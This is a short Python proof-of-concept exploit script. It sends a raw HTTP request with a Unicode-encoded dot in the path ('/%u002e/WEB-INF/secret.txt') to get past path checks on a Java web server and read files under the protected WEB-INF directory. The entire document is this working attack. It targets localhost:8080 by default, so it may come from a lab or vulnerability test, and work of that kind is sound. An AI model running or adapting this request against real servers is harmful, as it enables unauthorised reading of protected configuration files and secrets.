import socket
import argparse

# Set up argument parsing
parser = argparse.ArgumentParser(description="Attempt to access sensitive files via various plugins.")
parser.add_argument('--host', type=str, default='localhost', help='Target host (default: localhost)')
parser.add_argument('--port', type=str, default='8080', help='Target port (default: 8080)')

args = parser.parse_args()

# Use arguments from CLI or default values
host = args.host
port = args.port
# Set up the connection to localhost
url = "/%u002e/WEB-INF/secret.txt"

# Raw HTTP GET request
request = f"GET {url} HTTP/1.1\r\n" \
          f"Host: {host}:{port}\r\n" \
          "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\n" \
          "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n" \
          "Accept-Language: en-US,en;q=0.5\r\n" \
          "Accept-Encoding: gzip, deflate\r\n" \
          "Connection: close\r\n" \
          "Upgrade-Insecure-Requests: 1\r\n\r\n"

# Create a socket
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, int(port)))
    s.sendall(request.encode())
    
    # Receive the response in chunks
    response = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        response += chunk

# Print the response (headers and body)
print(response.decode('utf-8', errors='ignore'))
